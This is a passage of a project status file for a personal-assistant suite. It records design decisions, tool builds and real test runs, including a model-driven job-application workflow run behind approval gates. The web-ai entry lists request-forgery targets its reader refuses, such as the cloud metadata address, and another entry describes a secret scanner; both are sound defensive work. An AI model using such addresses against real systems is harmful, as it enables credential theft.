# suite — where it stands, and what comes next

`CLAUDE.md` holds the rules for working here. **This file holds the state**: what is built, what is
rough, what is waiting on a decision, and the next steps in order. Update it when any of those
change — a new session should be able to pick up from here without the conversation that got us
here. Each tool keeps its own `plan.md` or `CLAUDE.md` for its internals; this covers the whole.

As of **2026-10-30**. **Deleting from the web app was built and run for real on 2026-10-30** (see "Built and verified"; committed and pushed). **The job-application workflow was run end to end through the model on 2026-10-30** (the African Languages Lab application; see "Built and verified"). The application-tailoring checks (`apply-ai`, docu-ai's layout and trash, the draft marker) were
built and run for real through the chat on two real postings on 2026-10-15, and are committed (`92d0f24`). A third
application on 2026-10-24 showed eight gaps; the plan to close them is under "Gaps found on 2026-10-24" below, and
**none of it is built yet**. On 2026-10-25 the database, caching and multi-user architecture was decided: Postgres
first, then Redis, then multi-user, then RAG — see "Database, caching and multi-user" below. **Layer 1 (Postgres) was
built and run for real on 2026-10-28; Redis, multi-user and RAG are not built. On 2026-10-29 Redis was deferred to
layer 3 (the user's call), after the queries it would cache were timed and cost 1 to 10 ms.** Containers are now the primary
runtime (locked decision 10), and `./start` now runs `./start-docker up`. The job-application workflow's first piece, **`web-ai` (reads a web page), was built on 2026-10-28**, and **mail-ai attachments on 2026-10-29** (tested and run on the real PDFs against a stand-in Gmail; a real Gmail draft with attachments was made and read back on 2026-10-30), and the end-to-end run through the model on 2026-10-30. Deployment to the company instance is pinned
(below). audiobook joined on 2026-10-10 (`98c60e3`).

## What this is

A personal assistant and the single-purpose tools it runs, replacing the old `personal-ai`
monolith. One folder, one install, one start command — but separate programs that never share a
process, a module or a credential (see `CLAUDE.md`).

| Part | Folder | What it does |
|---|---|---|
| Web app | `web/` | Chat and Buttons modes over one shared state (Meetings, Documents, Audiobooks, Mail, Memory, History, Settings). Port 8751. |
| Backend | `assistant/` | API on port 8750. Starts the tools as MCP children, runs chat turns on the model, gates every write behind an approval, audits every call. |
| meet-ai | `meet-ai/` | Record, transcribe locally (faster-whisper), notes and formal minutes where every point must resolve to a verbatim quote. |
| docu-ai | `docu-ai/` | Markdown → properly formatted Google Doc, zero markdown residue. Looks: `technical`, `resume`, `letter`. |
| mail-ai | `mail-ai/` | Gmail: sync, read, search; draft, review and send (send needs two presses over the rendered mail). |
| apply-ai | `apply-ai/` | Checks for a job application, reads only: a posting's requirements against what the user's own material shows (gaps asked about once, before drafting), and a draft's claims traced to source lines. No model. |
| audiobook | `audiobook/` | PDF → audiobook in a cloned voice, locally (Docling to read, Pocket TTS to speak). Reading and rendering are background jobs. Own `.venv`. Its UI is the web app's Audiobooks panel. |

## Locked decisions

Settled; reopen only with new evidence, and say so here when one changes.

1. **Tools first.** Each tool is standalone with two front doors (CLI and MCP) over one
   `operations` layer; the assistant only classifies, calls, approves and audits. The design
   record is the "Tools-First Rebuild" plan doc (claude.ai artifact a2ae50bf-…); this file is newer.
2. **One repo, separate programs** (2026-09-27). Merged with histories rewritten under each folder.
   The old GitHub repos (Philips-DR/assistant, meet-ai, mail-ai, docu-ai, and audiobook — "keep old
   repo", 2026-10-10) stay live and are **not** to be archived — the user said so. `suite` pushes to github.com/Philips-DR/suite (**public since 2026-10-24**, the user's call; all 80 commits were scanned first and held no secret values).
3. **Web app fully separate from the backend** (2026-09-28): own folder, server and port, calling the
   API across origins. No proxy, no page served by the backend.
4. **No token pasting.** `./start` makes a random token per launch and hands it to both programs;
   the web app's server injects it into the page at serve time. Google login was considered and is
   the wrong tool for one user on one machine — it becomes right only if the app is deployed.
5. **The model is Opus 4.6 on Bedrock**, SSO profile `ayadata-bedrock`. Opus 5 / 4.8 / Sonnet 5
   return 403 on this account (probed 2026-09-20). Minutes run at `medium` effort, notes at `high`
   — measured, see `meet-ai/CLAUDE.md`.
6. **Nothing a model writes is trusted on its word.** Notes and minutes drop any point whose quote is
   not in the transcript; a rewritten document is measured against its original at approval time.
7. **Localhost by default; reachable over Tailscale** (2026-10-10). The user chose a private network
   (Tailscale) over a public address: only devices signed in to the user's tailnet can reach it, and
   nothing is published to the internet. Done in containers (`./start-docker up --tailscale`); the host
   install stays localhost-only. A public address, with or without Cloudflare Access, was considered
   and not chosen. **Changed 2026-10-14, the user's call: Tailscale is dropped.** The suite is to run
   on a company EC2 instance the user may use but not otherwise administer (no DNS records, no
   security-group or IAM changes), reached for now through SSM. nginx on the host sits in front, with
   HTTP basic auth over HTTPS (a self-signed certificate, since there is no domain to get a real
   one) as the interim lock, and the Google sign-in (decision 9) to replace it. The page still hands
   its token to whatever can open it, so nothing is opened to the internet without that lock. The
   Tailscale sidecar stays in the repo, unused.
8. **audiobook has no interface of its own** (2026-10-10). Its standalone web app was removed and every
   feature rebuilt in the suite's web app. It has its own `.venv` (weight and PyTorch's CPU index, not
   a version conflict), and a voice is cloned only with a consent statement the user writes.
9. **A Google sign-in is the next big feature**, and the container setup is built to take it: one host
   name over HTTPS for both programs, exact hosts and origins from the environment, the page's token
   switchable off (`WEB_INJECT_TOKEN=0`), and one `authenticate()` in the backend where a session
   would plug in. What it changes is written down in `assistant/CLAUDE.md` ("Authentication").
10. **Containers are the primary runtime** (2026-10-25, the user's call). `./start` calls
    `./start-docker up`. The host-only path (starting the backend and web app as bare processes) is
    dropped. Postgres, Redis and any future infrastructure live as Compose services; no dual code path.
    Tests still run outside the container (`./test`) against file-based stores, with no Postgres needed.
11. **Records and text in the database, files in one central store, no per-user folders** (2026-10-31, the user's
    call). Every record and all text go in PostgreSQL; audio and other files stay files, but in one file store for
    the whole suite, not in each tool's folder; a file on the user's Google Drive is their own folder and stays
    there; everything else kept for a user is a row with a `user_id`. See "Layer 1b" below.

## Built and verified

Each was tested (`./test`) and run for real; the real runs found most of the bugs.

| When | What | Where to read more |
|---|---|---|
| 09-20→25 | docu-ai credentials-in + MCP door; meet-ai layers, capture sessions, background transcription; mail-ai sync + compose/send gate | each tool's `CLAUDE.md` |
| 09-26 | Assistant as a long-running server; web interface (chat + buttons as one state); Meetings, Mail, Memory, History, Settings; job-finished notices | `assistant/CLAUDE.md` |
| 09-26 | First real meeting end to end: a 2-hour members' meeting (`meet-ai/transcripts/20260812_102457.*`) → transcript → notes → Google Doc | — |
| 09-26 | Formal minutes (43 points, 4 pages, 84 s) and `read_transcript`; notes titled by the meeting | `meet-ai/CLAUDE.md` |
| 09-27 | The suite: one repo, `./setup`, `./start`, `./test`, one shared `.venv` | `CLAUDE.md` |
| 09-28 | Frontend/backend split; automatic token hand-over; uploads (audio, `.md` files, folders) from Meetings, Documents and chat | `assistant/CLAUDE.md`, `web/README.md` |
| 09-28 | Drafting: the assistant can read an upload and write a tailored version (e.g. a CV for a role), measured against the original; CVs build in the résumé look | `assistant/CLAUDE.md` → Drafting |
| 10-10 | audiobook joined: merged with history, own `.venv`, MCP door (12 tools), detached background jobs that survive a backend restart and can be cancelled, PDF and recording uploads, path-confined audio playback and download, finished-job notices, and the Audiobooks panel (read a book, chapter table and exact text, corrections, voices with consent, render with progress, play and download). Run for real: Whisper heard a sample 100% right; a chapter rendered to MP3 + M4B; a render outlived `pkill` of the backend; the same flows through chat and in Chrome. | `audiobook/CLAUDE.md` → The suite integration; `assistant/CLAUDE.md` → Audio a tool made |

| 10-10 | **A new interface.** Overview dashboard (KPIs with deltas and sparklines, activity by tool per day, outcomes, time per tool, tool health, what is running, recent activity), Chat with suggestions and grouped tool chips, and every tool page rebuilt: Meetings as a Record → Transcribe → Write up flow, Audiobooks with chapters as a chart that is also the chooser, Mail as list-then-thread on a phone, History with filters and cross-filtering charts, Settings with a latency chart. A sidebar, rail or bottom tab bar by width; light, dark or system; Ctrl+K; animations that honour reduced motion; fonts bundled, no outside requests; pages loaded on demand (initial script 280 kB, down from 552 kB). Run for real: axe-core found and I fixed contrast, a nameless button and a missing heading, then 0 violations on all 9 pages × 2 themes × 2 sizes; 25 browser interaction checks; 28 unit tests; a real book driven through the Audiobooks page. | `web/DESIGN.md` |
| 10-10 | Containers: `./start-docker`, two images (backend 4.9 GB with every tool; web 0.4 GB), one `./data` volume, an optional Tailscale sidecar with HTTPS on 443 (web) and 8443 (API), exact hosts and origins from the environment, the API address found at run time. **Run for real:** both images build; every suite passes inside the image, and offline with an empty model cache; the stack comes up healthy and publishes only 127.0.0.1; all five tool servers start (same tool counts as the host); a real voice sample (Whisper: 100% match) and a render, cancelled and resumed, from the container; a container restart mid-render leaves it `interrupted` and a re-run resumes; the page opened by a different name in Chrome calls the API on that host at 8443, gets its event stream and plays audio, and a name nobody configured is refused; the microphone override lists PipeWire's sources. **Not run:** the Tailscale sidecar against a real tailnet (the image does accept every variable the compose file uses, but the serve config, MagicDNS and HTTPS certificates are unproven until it is joined), real TLS, an actual recording, and a server host. | `README.md` → In containers; `CLAUDE.md` → In containers |
| 10-15 | **Tailoring a CV, with checks.** Built from one real tailoring done by hand on two applications (World Bank, AfricaRice). **apply-ai** (new tool, 87 tests): `requirements` reads a posting into numbered items and sets each against the user's own files and confirmed facts — degree, language, named tools and years of experience checked exactly (years computed from the dated roles), the rest traced by shared words, character traits listed apart, the questions merged so none is asked twice; `claims` traces every figure, overstating word (daily, most, directly, led, deployed, open, fluent, extensive…), tool, language, degree and name in a draft to a source line, notices a limit the source put on a claim that the draft drops, and refuses an assistant-written draft as a source. **docu-ai**: `build` returns `layout` (page count; a heading stranded at a page foot; a page target missed; a stray last page) read from the PDF Docs exports; a `keepLeadWithNext` theme rule that fixes the stranded heading, shown on a control build; `layout`, `info` and a gated `trash` (approval shows the Doc's title, times and link); a full Drive now says so instead of "The caller does not have permission". **assistant**: drafts are marked `.draft`; `MAX_TOOL_ROUNDS` 12 → 30; no change to the prompt. **Run for real:** both real postings against the real CV reproduced every gap found by hand; the check found the one unconfirmed claim in the real finished CV (Linux); through the real chat on Bedrock, in an isolated copy, the model called `requirements` first, asked in one message, recorded the answers, fixed its own "daily", "most directly" and "fluent", built to a 2-page target (3 → 2 after a trim), trashed the superseded Doc through the gate, and on a second application reused what it knew and refused-then-corrected itself when it passed its own draft as a source. The backend image builds with poppler-utils and apply-ai and every suite passes inside it (`./start-docker test`; `pdftotext` and `./apply` checked in the image); **the running containers are still on the old image until `./start-docker up`** (not while a long render is going). **Not run:** a full-Drive 403 (unit-tested against the shape Google sent), the web app's pages for the new tool (it appears in Settings with the default colour). | `apply-ai/CLAUDE.md`; `docu-ai/CLAUDE.md` → Layout; `CLAUDE.md` → Tailoring a CV |
| 10-28 | **Postgres (layer 1 of the database plan).** Memory, the audit log and sign-in sessions are in PostgreSQL when `DATABASE_URL` is set (compose sets it), and in the files they were otherwise, which is what every test uses. Each is an abstract store with a file and a Postgres version; every store method is async, which ran through `LocalTool.handler`, `prepare`, `tools_status` and `audit.record`. Numbered SQL migrations (`assistant/migrations/001_initial.sql`: all six tables; `users`, `dossiers`, `dossier_refs` laid down, unused), a runner in `db.py`, and a one-time import of `memory.json` and `audit.jsonl` that renames each to `.imported`. A `postgres:16-alpine` service in Compose, run as the host uid, no published port, data in `./data/postgres`. `./start` is now `./auth` then `./start-docker up`. Tools are not given `DATABASE_URL`. **Run for real:** the actual server on copies of the real `data/assistant` files, once on files and once on Postgres: 707 history rows and 15 facts identical through the API, last call per tool server identical, the lexicon identical, a write and read-back; then the real backend container (all five tool servers up, 52 tools; run on the existing image with the new code laid over it) on Postgres: it imported 15 facts and 707 audit rows and renamed the files, the data survived a backend restart with no second import, stopping Postgres left the API up (history and status empty, memory reads and writes failed honestly) and it recovered when Postgres came back, and no tool process held `DATABASE_URL`. **The live import on `./data` was run on 2026-10-29** (committed as `78fb441`): `./start-docker up` on a fresh `data/postgres`; the backend reported 15 facts and 707 audit rows imported and renamed both files `.imported`, byte-identical to a copy taken first (sha256). Compared against the old files: all 15 facts identical in Postgres; all 707 history rows identical through the running API, in order, except that a field with no value is left out instead of being `"error": null` (698 rows; the web app types `error` as optional-or-null and nothing tests for null). `lexicon.json` unchanged. **The web app was then driven in Chrome against it, the same day** (Overview, Memory, History and Settings at 390 and 1440 px wide; screenshots looked at): no console or page errors, no refused API call, no horizontal overflow; all 15 facts shown (the page's own counts: 1 person, 1 preference, 6 spellings, 7 other); the on-screen numbers equal ones recomputed from the old files (Overview 14 actions, 10 mail and 4 meetings, all succeeded; History 292 succeeded, 6 failed and 2 declined of the latest 300, so 98%; results by day 110, 2 and 1); Settings said everything was working once the logins were renewed. **Not run:** axe-core (not installed), the pages for Chat, Meetings, Documents, Audiobooks and Mail, and a real phone. | `assistant/CLAUDE.md` → The database |
| 10-28 | **The speaker models now come from Hugging Face, not GitHub** (`meet-ai/fetch-models.sh`, which the backend image build runs). An image build could not finish: the GitHub release download timed out twice (133 s each; from this host IPv4 to `github.com` timed out and IPv6 has no route, while Hugging Face answered). Both files are on Hugging Face (`csukuangfj/sherpa-onnx-pyannote-segmentation-3-0`, `csukuangfj/speaker-embedding-models`) with the same size and SHA-256 as the copies already in use, which the script now checks on every download (a wrong one is refused and leaves nothing behind). **Run for real:** from an empty folder on the host, and as a `RUN` step in BuildKit's network (12.7 s, where the old one failed), byte-identical to the models in use; a deliberately wrong hash exits 1 with no file left; then the real `docker/backend.Dockerfile` built to the end, and in that image the models, asyncpg 0.32.0 and the migration are present and the assistant tests pass offline (161 passed, 8 skipped). **Not changed, and still true:** the model step sits after `COPY . /app`, so any edited file re-runs it (about 12 s now, not a failure). | `meet-ai/fetch-models.sh` |
| 10-28 | **web-ai: a tool that reads the web (gap-plan step 3, job-application workflow 1a-1c).** `read_page` (the page's own text and its links, never a summary), `check_link` (HEAD only) and `github_visibility` (what a stranger sees, asked with no login; says it cannot tell a private repository from one that does not exist). Every address is resolved and every answer must be public, then the connection goes to that address (no second lookup); redirects are re-checked at every hop; no cookie, proxy, login or body; 5 MB counted after decompression, 30/60 s; a hidden element or an invisible character is dropped from the text. A refusal is an error result, so the audit log records it as failed. Registered in `tools.yaml`, `setup`, `test`, the Dockerfile and `start-docker test`. **Run for real:** 149 tests against a local server that records what it is sent (and four deliberate breaks of the code, each caught by its test); real refusals (169.254.169.254, localhost, `2130706433`, `file:`, a password in the address); example.com over TLS, an 89 KB Hugging Face page with 47 links, a PDF refused, GitHub's API for a public repository, a missing one and an account; launched over stdio through the assistant's own `execute()` (read-only, refusal audited `failed` with the reason, a good read `ok`); in a container on a compose-style network a service name resolving to a private address is refused while a plain TCP connection to it succeeds. **Found by running it:** the MCP SDK hides the reason of any error that is not its own `ToolError`; a source newline was being kept as a line break; a short whole page (example.com) was wrongly warned as script-built; "could not connect" hid that every address had timed out (IPv4 from this machine times out about half the time). **Not run:** a real job posting; a headless browser (not built); the whole backend image rebuilt with web-ai in it (done 2026-10-29: the image built and web-ai's 3 tools came up beside the other five servers, 49 tools in all, no errors in the backend log). **Not decided, and yours:** see "Waiting on the user", items 11 and 12. | `web-ai/CLAUDE.md` |
| 10-29 | **docu-ai: gap-plan step 1, approved by the user on 2026-10-29** (step 2, mail-ai, waits for a second yes). Word export asks Drive for an array buffer as PDF does, and every export is checked for what it is (`%PDF-` / `PK`), so garbage from Drive is an error, not a file; `export` takes its format from the name (`.docx`, `.pdf`, none = PDF); `resume` and `letter` write `out.pdf` and `out.docx` together and print the page count (the misplaced comment is fixed); `--title` on `build`, `resume`, `letter`; `--replaces <docId>` checks the old document before building and trashes it, through the existing `trash`, only if the new one is clean (no markdown left, no layout warning). **Not on the MCP door, on purpose:** through a model it would trash inside a build's approval, which shows an opaque id; the model keeps using `trash`, whose approval is previewed. **Run:** 369 tests (29 new), and five deliberate breaks of the code (no array buffer, no signature check, an unfinished build replacing, an already-trashed document accepted, the trash before the build), each caught by its test. Committed 2026-10-29 (`3219ce6`; web-ai is `b4fb2ba`, the speaker models `8ef074e`). **Not run against Drive** (the Google login had lapsed, `invalid_grant`, and was renewed later the same day; a live run builds a real Doc in the user's Drive, so it waits for a yes): a real Word export, a real `resume` with both files, and a real `--replaces` have not been seen, and `npm run lint` was already red on one committed line (`test/drive.test.ts:101`, an unbound method). | `docu-ai/CLAUDE.md` → Word, PDF and replacing |
| 10-29 | **mail-ai attachments (gap-plan step 2, approved 2026-10-29 after the user had seen the send-check tests).** `draft_new` takes `attachments` (`{filename, data, mime_type?}`, `data` standard base64); a message with files is multipart and each file arrives byte for byte. The send check covers every file by name and content, in order: change, add, remove, rename, replace or reorder one and the confirmation fails; a message with no files fingerprints exactly as before (two values pinned). `review` lists each file with its size above the body. Gmail keeps a file's bytes apart from the draft, so review and send each read them again; a file that cannot be read, or comes back short, stops both. Base64 is read strictly; an empty file, and a name with a slash, a control character or a right-to-left override, are refused before Gmail, and one bad file means no draft. `send` still takes only a draft id and a confirmation. **Run:** 132 mail-ai tests (57 new); thirteen deliberate breaks of the code, made in copies, each caught (the first run missed one, a weak test, which was fixed); the real CV and cover-letter PDFs (96,898 and 51,311 bytes) built into one 200,972-byte message and read back identical, reviewed, one flipped byte refused, the real bytes restored and sent against a stand-in Gmail. **Not run:** a real Gmail draft (the compose login is dead, and it writes to the real mailbox, so it needs the user's yes), so the attachment shape is Gmail's documented one, not an observed one; a model passing the base64 through chat (item 13 under "Waiting on the user"). The CLI's `draft` takes no files. | `mail-ai/CLAUDE.md` → Attachments |

| 10-30 | **Deleting, from the web app.** Clear chat (the conversation, not memory or the audit log; refused while a turn runs or an approval waits); delete an uploaded recording (Meetings), markdown batch (Documents) or PDF; move a Drive document to Drive's bin (Documents, through docu-ai's `trash` and its `info` preview); delete an audiobook (its audio, through a new destructive audiobook tool `delete_audiobook` whose approval shows a new read-only `describe_audiobook`, then its uploaded PDF). Every delete is asked about first in one dialog (what goes, what is not touched), audited, and reachable only by a button for uploads (no tool deletes a person's files). **Run for real:** a throwaway Google Doc built in the user's Drive and moved to the bin through the page (Drive itself then said `trashed: true`; Escape first left it untouched); throwaway recording, markdown batches, PDF and audiobook folder deleted through the page at 390 and 1440 wide, each checked gone on the server, the user's real uploads and audiobook folders the same, by name, before and after; Clear chat on a real conversation. **Found by running it, and fixed:** the dialog was trapped inside its animated card (its button pressed the row underneath; now drawn into `<body>`); Cancel was disabled while the audiobook dialog loaded, so focus stayed behind it; the audiobook dialog said the PDF was untouched while deleting it; a button chip outlived Clear chat. Tests: 30 new in the assistant, 24 in audiobook, and twelve deliberate breaks of the code, each caught (one first survived: a link to a file in the same uploads folder, which then got its test; audiobook had the same case tested from the start). **Not run:** a model's reply in the cleared chat (the AWS login had lapsed; the clear was tested on a failed turn), and a model calling `delete_audiobook` through chat's approval. **Left as they are:** recordings meet-ai made itself are not uploads and have no delete; voice-sample uploads can be deleted by the API but have no button; a PDF's `.corrections.txt` stays beside it. | `assistant/CLAUDE.md` → Deleting; `audiobook/CLAUDE.md`; `web/DESIGN.md` |

| 10-30 | **Files reach an email by path (job-application workflow step 3, and decision 13).** docu-ai `save_export` writes an exported Word or PDF file into the assistant's `uploads/exports` (`DOCU_AI_EXPORTS`) and returns its path, never its bytes; it is not read-only, and its approval shows the document's title (`info`). mail-ai `draft_new` takes `{path}`, read only from that folder (`MAIL_AI_ATTACH_ROOT`; links, outside paths, folders and oversized files refused), with 10 MB in all, base64 still taken for a small file. `export` (the web app's download) now tells a model never to use it to attach. **Run for real, without the model:** the real African Languages Lab CV and letter saved as Word files through the gate (654,050 and 651,163 bytes, `PK`), attached by path to one Gmail draft to the user's own address, read back by `review_draft` with the same confirmation (so Gmail holds the same bytes: the first real read-back of attachments), discarded through the gate, the user's draft to the recruiter untouched, the test files removed. Inside the container both tool processes were seen to hold the same folder. Tests: docu-ai 17 new, mail-ai 18 new; ten deliberate breaks, each caught. **Found:** a first version held invisible reversing characters in docu-ai's source; written as escapes now, and a scan of every changed file finds none. **Not run:** the model following these descriptions through a whole application (the AWS login had lapsed). **Not changed, noted:** `mail-ai/mailai/compose.py` (from 2026-10-29) keeps its list of reversing marks as the invisible characters themselves; it works, but reads as empty. | `docu-ai/CLAUDE.md` → save_export; `mail-ai/CLAUDE.md` → Attachments |

| 10-30 | **The job-application workflow, end to end through the model (workflow step 4).** The 2026-10-24 application run again in the real chat (Opus 4.6 on Bedrock, the running containers), opened with the user's own words from that day and `https://www.africanlanguageslab.com`; the email draft addressed to the user's own address, not the recruiter. The model read the homepage, Opportunities and Full-time roles and found the AI/ML Engineer link itself; that page builds itself in script, so `read_page` returned no text and a warning, and the model asked for the posting. Given the job site's public data address, it read job 37 (the 100-job list came back cut before job 37, so it fetched `/api/jobs/37` itself). Then: `requirements` first (it passed a marked draft as material, was refused, and retried without it); seven gaps asked in one message; GitHub checked with `github_visibility` and the false "Repositories are private" line removed; `claims` on both drafts, the letter's three dropped limits fixed and re-checked (a fourth left, with a stated reason that holds); the CV built at 3 pages against a 2-page target, the docu-ai project cut and said so, re-checked, rebuilt at 2; the 3-page Doc trashed through the gate; both saved as Word with `save_export`; one Gmail draft with both attached by path. Nothing sent; every approval read in full first. **Looked at:** both Docs as PDF (CV 2 pages, letter 1, no markdown left) and the Word files' text; Gmail's read-back gave the draft's own confirmation, so it holds the same bytes. Then everything the run made was removed (the draft discarded, three Docs in Drive's bin, three draft folders and both files deleted) and checked gone; the user's real draft to the recruiter and final Docs untouched; memory unchanged at 15 facts. **Found:** four things, under "Still open" → tailoring a CV. | — |

| 10-30 | **apply-ai: career claims, private code and the email body (the user's go-ahead, the same day).** `claims` takes `public_links`, the addresses web-ai found a stranger can open: a sentence calling code private is a `public link` finding when the address it names, or a repository on a code host, is public, and `unchecked` (saying how to check) when nothing was passed. "Spent my career" and its kin are watched phrases. The description says to check the email body before `draft_new`, and to check addresses before calling code private. `CV - ML Engineer` (the assistant's own, 2026-09-28) now carries the `.draft` marker. **Run:** 103 apply-ai tests (16 new) and thirteen deliberate breaks, each caught; seven real documents, old code against new, changed only where they should; the backend rebuilt (`./start-docker up`) and the chat driven for real: the model checked an email body unasked, fixed what it found and re-checked; asked to check a "repositories are private" line, it looked GitHub up, passed the addresses and told the user the line was false. **Not followed:** a line the user dictated went to `draft_new` without a re-check. Every draft was declined at the gate; nothing reached Gmail. | `apply-ai/CLAUDE.md` → Verified for real (2026-10-30) |

| 10-30 | **apply-ai: the rest of gap-plan step 4.** `claims` takes `employer` (the employer's pages as text): a finding drawn from their pages or the posting, in a sentence addressed to them that says nothing of the user, is listed in `about_the_employer` instead of counted; anything else stays a finding, marked. A negation reaches four words back within its clause. A limit said anywhere in its paragraph counts as kept. **Run:** 111 tests (8 more), 24 deliberate breaks across both batches each caught; on seven real documents with the employer's real homepage and research page, two false alarms gone ("production" in the 2026-10-24 letter, a dropped limit in today's) and nothing else changed; the backend rebuilt and the chat driven: checking a letter written from the employer's site, the model passed `employer` and used the marker to keep "ACL 2026" and "74+". **Not followed:** asked only to show a letter, it skipped the check. It also asked to remember Sheriff Issaka as the referrer (the user's own words of 2026-10-24); approved, fact `718ca00f`. | `apply-ai/CLAUDE.md` → Verified for real (2026-10-30) |

| 10-30 | **Mail syncs every 30 minutes, open page or not (the user's own to-do, approved the same day).** A tool's entry in `tools.yaml` may carry `schedule: [{tool, every_minutes}]`; the backend runs it at start and after each interval through `session.execute`, origin `schedule`, audited only when its outcome changes, never shown in the conversation or noted for the model, with a notice when it starts failing and when it recovers. mail-ai's `sync` has one; the web page's own timer is gone; History shows "Schedule". A wrong entry stops the server starting. **Run:** 17 new assistant tests (208 in all) and fourteen deliberate breaks, each caught (one first survived: a check for YAML's `true` that the five-minute floor already covered, so the check was removed); then the real rebuild with no page open: the first scheduled sync, a full re-sync, took 5 min 34 s and added 1,040 messages the mailbox lacked (3,337 to 4,378), audited as the schedule's, with nothing in the chat. **Not handled:** a sync pressed in Mail during a scheduled one reaches mail-ai at the same time. | `assistant/CLAUDE.md` → On a timer |

| 10-30 | **`./publish-check` (gap-plan step 7, approved the same day).** Before a push to the public repository, it reads the commits GitHub does not have: every added line, message and author. **Must fix** (exit 1): a key or token in a known shape (AWS, Google, Anthropic, GitHub, Hugging Face, Slack, private keys, JSON web tokens), any value in this machine's own login files (`.env`, the Google client and token files, the Hugging Face token, the AWS SSO cache: 20 values here), and a credentials file. **Look first** (exit 2): an email, a phone number, a server id, an AWS account number, a public IP address, a personal-data file, or a word in the git-ignored `.publish-watch`, unless already public on the remote. `--all` reads every commit for what must be fixed. A secret is shown as four characters and a length, never whole. Stdlib only, in `publish/`, its tests in `./test`. **Run:** 15 tests and twenty deliberate breaks, each caught (two first survived, both checks that could never fire; removed); the whole real history (101 commits) against the 20 real secret values: nothing; in a throwaway clone, this session's real pending changes (16 files): nothing to fix, two details already public; the same plus a planted real Hugging Face token and a phone number: both caught, exit 1, the token never printed. **Found by testing:** an IP address at the end of a sentence was missed. **Not run:** a push of a real commit through it (it is a command, not a hook). | `CLAUDE.md` → Working in this repo |

| 10-30 | **Audiobooks: the title, the chapters, and the page (the user's request).** A book was named by its 120-character file name, its title was "Praise for" (the first heading), and its chapter list was its contents page: 16 chapters of one sentence and a 3 h 52 min "Introduction" holding the book. Now: the title from the PDF's own metadata (placeholders like `about:blank` ignored), else the file name without what Z-Library or Library Genesis added and cut at the title page's heading ("Dreams and Visions", Jane Hamon); the contents page left out and each chapter started on its own first page and named as the contents page names it (19 chapters, 5 to 23 minutes each). The page is two levels: a library (each book with its state, its audio, Open and Delete; the voices and their samples) and a book (back link, title, the chapters as a list with a play button on each rendered one and its text opening under it, Render, its other audio, what was left out, corrections). An upload opens its book and starts reading it; deleting a book can keep its audio. Jobs carry the book's title. On a phone the stat tiles are left out and a chapter's title has its row's width. **Run:** audiobook 131 tests (24 new) and twenty deliberate breaks, each caught; the real book re-planned; in Chrome at 360, 390, 412 (as a phone renders it), 820 and 1440, light and dark: nothing wider than the screen, axe clean (it found the icon rail's logo link had no name: fixed); then, after the user's screenshot from a 1066-wide window showed chapter titles a letter a line (the rows were laid out by the window, not their card), every width from 360 to 1920 measured; a never-seen PDF uploaded, read by itself, its chapters shown, deleted; the delete dialog opened and cancelled on a real book. **Not run:** rendering the book with its new chapters (hours; the old files show as "From an earlier reading"). | `audiobook/CLAUDE.md` → How a book's title and chapters are found |

| 10-30 | **Mail made better, and the audiobook Voices card folds (the user's requests).** Mail: the mailbox card is one line (messages, when it last synced, Sync), from a new `synced_at` in mail-ai's `status`; the list has Inbox and Drafts and a New email button; Drafts lists what is in Gmail (who to, subject, first words, from `list_drafts`, now read as metadata so no file is fetched), and a draft opens whole, to send or discard; New email saves a draft and takes the same steps as a reply (the whole email shown before the one press that sends); an email's runs of blank lines are folded (one newsletter was 431 empty lines of 462), and a conversation shows its newest message open and the earlier ones as a line each; Load more lengthens the list. **Found and fixed:** the page's Discard never discarded — the server answers a button's first press with the draft to confirm, which the page took for done, and it said "Draft discarded." over a draft still in Gmail. Audiobooks: Voices is folded to one line by default, remembered in the browser. **Run:** mail-ai 153 tests (3 new), web 47 (8 new), nine deliberate breaks each caught; in Chrome at 11 widths from 360 to 1920 (phones rendered as phones), light and dark, in five states each: nothing wider than the window, axe clean (it found two landmarks named "New email": fixed); the real flow on the phone layout to the user's own address only — saved, Send's first press showing the whole email then Cancel, opened from Drafts, discarded — then checked on the server: the audit log has no `send_draft`, Gmail's drafts back to 6, a sync found nothing sent. **Not run:** saving a reply (its draft would go to another person); the reply steps are the same component as a new email's. | `mail-ai/CLAUDE.md` → For the Mail page |

| 10-31 | **Documents made better (the user's request; all five changes they chose).** 22 of the 65 documents in Drive were called "Philip Baah Afriyie" (a single file was named for its first heading, the sender). Now every build is named for its upload ("CV - ML Engineer"), shown and editable as "Name in Google Drive", and a new docu-ai tool, `rename`, gives a built one a new name (Drive's name only; no preview, so one press; refuses an empty or over-long name, a control character, a reversing mark, a Doc not built by docu-ai or in the Trash). The page offers docu-ai's third look, Letter, and picks the look from the upload's name (a word on its own: "newsletter" is not a letter); a page limit (none, 1, 2) for one file; after a build, the page count and every warning (pages over the limit, a stranded heading, leftover markdown); after a rebuild, the earlier Doc offered to the bin through the same confirm-first dialog. Uploads are one line each that open to build (an upload opens by itself); a document's row shows when it was made and puts its buttons under its name on a narrow card. **Run:** docu-ai 395 tests (9 new), web 57 (10 new), fourteen deliberate breaks each caught; in Chrome at 11 widths from 360 to 1920, light and dark, in four states: nothing wider than the window, no button label broken onto two lines (the stricter check found "Upload .md files…" wrapped at 360 and 390: fixed), axe clean; the real flow on the phone layout with a throwaway upload only — built at a 1-page limit (it said "2 pages, limit 1" and why), built again at 2, the earlier one binned from the offer, the new one renamed, then binned, the upload deleted — and Drive's own `info` then said both were in the Trash, the second under its new name; the user's other 65 untouched. **Not changed:** the 22 documents still named for the sender (renaming them is the user's call; the page's hint says how). | `docu-ai/CLAUDE.md` → Renaming a built document |

| 10-31 | **Meetings made better, and Audiobooks' Voices moved (the user's requests; all five Meetings changes they chose).** Meetings: each is named by what is known of it, not its file name — the name its minutes verified ("Third quarter meeting, Akra Tema branch"), else the date its recording's name gives, else the name — with its length and speakers, from a richer meet-ai `list_recordings` (the transcript's own header, `recorded_at`, the minutes' JSON; `recorded_at` now also reads meet-ai's own recorder's names). **Found and fixed:** two of the five meetings never opened (chosen by timeline, and they have none: "Loading…" for ever); they open, say why notes cannot be written from them, read their transcript (meet-ai's `read_transcript` now reads one with no timeline from its markdown), and offer to transcribe the recording again; transcribing again used to skip silently (transcribe.py's own rule), so the page now names the transcript it replaces and passes `force` only then. Notes and minutes are read on the page (new read-only meet-ai `read_written`). A Doc from them is named as meet-ai names them, shows its pages and warnings, and a rebuild offers the earlier one to the bin (the shared `builtDoc.tsx`, which Documents now uses too). The list reads from the left, the newest meeting opens by itself side by side, recordings never transcribed are listed with Transcribe, and the list is no longer a listbox of buttons (axe). Audiobooks: Voices is off the library page and sits under a book's Chapters card, outside its grid, full width. **Run:** meet-ai 121 tests (8 new), web 68 (11 new), seventeen deliberate breaks each caught; in Chrome at 11 